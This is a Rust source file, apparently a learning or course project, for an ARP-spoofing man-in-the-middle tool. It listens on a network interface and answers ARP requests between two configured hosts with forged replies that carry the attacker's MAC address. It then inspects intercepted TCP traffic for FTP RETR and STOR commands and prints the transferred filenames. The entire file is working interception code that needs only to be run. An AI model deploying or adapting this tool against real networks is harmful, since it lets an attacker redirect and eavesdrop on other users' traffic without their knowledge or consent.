extern crate pnet;

use std::net::Ipv4Addr;

use pnet::datalink::{self, Channel::Ethernet};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::icmp::IcmpPacket;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::ipv6::Ipv6Packet;
use pnet::packet::tcp::TcpPacket;
use pnet::packet::udp::UdpPacket;
use pnet::packet::{MutablePacket, Packet};
use pnet::util::MacAddr;

pub struct Config {
    pub ip_src: Ipv4Addr,
    pub mac_src: MacAddr,
    pub ip_target: Ipv4Addr,
    pub mac_target: MacAddr,
    pub interface_name: String,
}

pub fn read_network_interface(config: &Config) {
    let interface_names_match = |iface: &datalink::NetworkInterface| iface.name == config.interface_name;

    // Find the network interface with the provided name
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter()
                              .filter(interface_names_match)
                              .next()
                              .expect("Error finding the specified interface");

    // Create a channel to receive on
    let (_, mut rx) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("Error creating datalink channel: {}", e),
    };

    println!("Listening on {}", config.interface_name);

    loop {
        match rx.next() {
            Ok(packet) => {
                let packet = EthernetPacket::new(packet).unwrap();
                // do not print packets from and for 00:00:00:00:00:00
                if packet.get_destination() == MacAddr::new(0, 0, 0, 0, 0, 0) || packet.get_source() == MacAddr::new(0, 0, 0, 0, 0, 0) {
                    continue;
                } else if packet.get_ethertype() != EtherTypes::Arp && packet.get_ethertype() != EtherTypes::Ipv4 {
                    continue;
                }
                if packet.get_source() != config.mac_target && packet.get_source() != config.mac_src {
                    continue;
                }

                // if the packet is an ARP packet request sent to the target or the source
                // send a reply to the source with the MAC address of the attacker
                if packet.get_ethertype() == EtherTypes::Arp {
                    let arp_packet = ArpPacket::new(packet.payload()).unwrap();
                    if arp_packet.get_operation() == ArpOperations::Request {
                        if arp_packet.get_sender_proto_addr() == config.ip_src {
                            arp_spoof(arp_packet.get_sender_proto_addr(), arp_packet.get_sender_hw_addr(), config.ip_target, &config.interface_name);
                        } else if arp_packet.get_sender_proto_addr() == config.ip_target {
                            arp_spoof(arp_packet.get_sender_proto_addr(), arp_packet.get_sender_hw_addr(), config.ip_src, &config.interface_name);
                        }
                    }
                } else if packet.get_ethertype() == EtherTypes::Ipv4 {
                    if let Some(ipv4_packet) = Ipv4Packet::new(packet.payload()) {
                        if ipv4_packet.get_next_level_protocol() == IpNextHeaderProtocols::Tcp {
                            if let Some(tcp_packet) = TcpPacket::new(ipv4_packet.payload()) {
                                // get the payload of the TCP packet as a string
                                let payload = String::from_utf8_lossy(tcp_packet.payload());
                                let filename = get_filename_ftp(&payload.to_string());
                                if filename != "" {
                                    println!("📦 {}:{} to {}:{}", ipv4_packet.get_source(), tcp_packet.get_source(), ipv4_packet.get_destination(), tcp_packet.get_destination());
                                    println!("Filename: {}", filename);
                                    println!();
                                }
                            }
                        }
                    }
                }
            },
            Err(e) => {
                println!("An error occurred while reading packet: {}", e);
            }
        }
    }
}

/// Function that prints the whole content of a ipv4 packet
/// like source and destination IP address, protocol, payload, etc.
pub fn print_ipv4_packet(packet: &Ipv4Packet) {
    match packet.get_next_level_protocol() {
        IpNextHeaderProtocols::Tcp => {
            if let Some(tcp_packet) = TcpPacket::new(packet.payload()) {
                if tcp_packet.payload().len() == 0 {
                    return;
                }
                println!("TCP Packet: {}:{} to {}:{} | Data Length: {}",
                         packet.get_source(),
                         tcp_packet.get_source(),
                         packet.get_destination(),
                         tcp_packet.get_destination(),
                         tcp_packet.payload().len());
                // Print payload data as a UTF-8 string
                // Note: This might not always be readable depending on the payload content
                println!("***Payload (UTF-8): {:#?}", String::from_utf8_lossy(tcp_packet.payload()));
            }
        },
        IpNextHeaderProtocols::Udp => {
            if let Some(udp_packet) = UdpPacket::new(packet.payload()) {
                println!("UDP Packet: {}:{} to {}:{} | Data Length: {}",
                         packet.get_source(),
                         udp_packet.get_source(),
                         packet.get_destination(),
                         udp_packet.get_destination(),
                         udp_packet.payload().len());
                // Print payload data as a UTF-8 string
                println!("***Payload (UTF-8): {:#?}", String::from_utf8_lossy(udp_packet.payload()));
            }
        },
        IpNextHeaderProtocols::Icmp => {
            if let Some(icmp_packet) = IcmpPacket::new(packet.payload()) {
                println!("ICMP Packet: Type {:?}, Code {:?}",
                         icmp_packet.get_icmp_type(),
                         icmp_packet.get_icmp_code());
                // Optionally print payload data as a UTF-8 string
                // Note: This might not always be readable depending on the payload content
                println!("Payload (UTF-8): {:#?}", String::from_utf8_lossy(icmp_packet.payload()));
            }
        },
        _ => println!("Unsupported IPv4 Protocol: {:?}", packet.get_next_level_protocol()),
    }
}

/// Function that prints the content of a ethernet packet
/// depending on the type of the packet
/// like ARP, IP, etc.
pub fn print_packet(packet: &EthernetPacket) {
    match packet.get_ethertype() {
        EtherTypes::Ipv4 => {
            if let Some(ipv4_packet) = Ipv4Packet::new(packet.payload()) {
                print_ipv4_packet(&ipv4_packet);
            }
        },
        EtherTypes::Arp => {
            if let Some(arp_packet) = ArpPacket::new(packet.payload()) {
                println!("ARP Packet: Sender MAC: {}, Sender IP: {}, Target MAC: {}, Target IP: {}",
                         arp_packet.get_sender_hw_addr(),
                         arp_packet.get_sender_proto_addr(),
                         arp_packet.get_target_hw_addr(),
                         arp_packet.get_target_proto_addr());
            }
        },
        EtherTypes::Ipv6 => {
            if let Some(header) = Ipv6Packet::new(packet.payload()) {
                println!("IPv6 Packet: Source: {}, Destination: {}",
                         header.get_source(),
                         header.get_destination());
            }
        },
        _ => {
            println!("Other packet: {} -> {}", packet.get_source(), packet.get_destination());
        }
    }
}

/// Function that sends a ARP reply
/// arguments:
/// - target_ip: the IP address of the target
/// - target_mac: the MAC address of the target
/// - src_ip: the IP address of the source
/// - src_mac: the MAC address of the source
/// - interface_name: the name of the network interface
pub fn arp_reply(target_ip: Ipv4Addr, target_mac: MacAddr, src_ip: Ipv4Addr, src_mac: MacAddr, interface_name: &String) {
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter()
                              .filter(|iface| iface.name == *interface_name)
                              .next()
                              .expect("Error finding the specified interface");

    let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, _not_used)) => (tx, _not_used),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("Error creating datalink channel: {}", e),
    };

    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    ethernet_packet.set_destination(target_mac);
    ethernet_packet.set_source(src_mac);
    ethernet_packet.set_ethertype(EtherTypes::Arp);

    //println!("Sending ARP reply to {} ({})", target_ip, target_mac);
    //println!("From {} ({})", src_ip, src_mac);

    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Reply);
    arp_packet.set_sender_hw_addr(src_mac);
    arp_packet.set_sender_proto_addr(src_ip);
    arp_packet.set_target_hw_addr(target_mac);
    arp_packet.set_target_proto_addr(target_ip);

    ethernet_packet.set_payload(arp_packet.packet_mut());

    tx.send_to(&ethernet_packet.packet(), None);
}

/// Function that performs arp spoofing by sending a ARP response
/// to the target with the MAC address of the attacker
/// arguments:
/// - target_ip: the IP address of the target
/// - target_mac: the MAC address of the target
/// - src_ip: the IP address of the attacker
/// - interface_name: the name of the network interface
pub fn arp_spoof(target_ip: Ipv4Addr, target_mac: MacAddr, source_ip: Ipv4Addr, interface_name: &String) {
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter()
                              .filter(|iface| iface.name == *interface_name)
                              .next()
                              .expect("Error finding the specified interface");
    
    let source_mac = interface.mac.unwrap();
    
    arp_reply(target_ip, target_mac, source_ip, source_mac, interface_name);
}

/// Gets a string that is the raw content of a ftp packet
/// prints the filname of the file sent or received
/// it should match the pattern: "RETR filename" or "STOR filename"
fn get_filename_ftp(payload: &String) -> String {
    let mut filename = String::new();
    let iter = payload.split_whitespace();
    // convert iter to vector
    let iter = iter.collect::<Vec<&str>>();
    if iter.len() < 2 {
        return filename;
    }
    if iter[0] == "RETR" || iter[0] == "STOR" {
        filename = iter[1].to_string();
    }
    filename
}
